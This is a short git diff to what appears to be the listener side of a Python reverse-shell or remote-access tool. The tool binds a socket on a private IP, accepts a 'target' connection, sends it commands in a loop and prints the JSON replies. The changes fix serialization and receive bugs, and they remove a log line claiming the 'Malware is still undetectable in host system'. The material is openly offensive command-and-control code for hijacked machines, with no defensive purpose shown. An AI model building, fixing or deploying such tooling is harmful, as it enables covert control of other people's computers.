@@ -7,7 +7,7 @@ import json
 
 
 def json_send(data):
-	json_data = json.dump(data)
+	json_data = json.dumps(data)
 	target.send(json_data)
 
 def json_recv():
@@ -31,9 +31,8 @@ def shell():
 		if command == 'q':
 			break
 		else:
-			print("[log] Malware is still undetectable in host system....")
-			json_recv()
-			print(json_recv())
+			result = json_recv()
+			print(result)
 
 def server():
 	global s
@@ -44,7 +43,7 @@ def server():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-	s.bind(("192.168.1.148",56789))
+	s.bind(("192.168.1.96",56789))
 	s.listen(5)
 
 	print(colored("[-*-] Listening for the connection.....", 'green'))
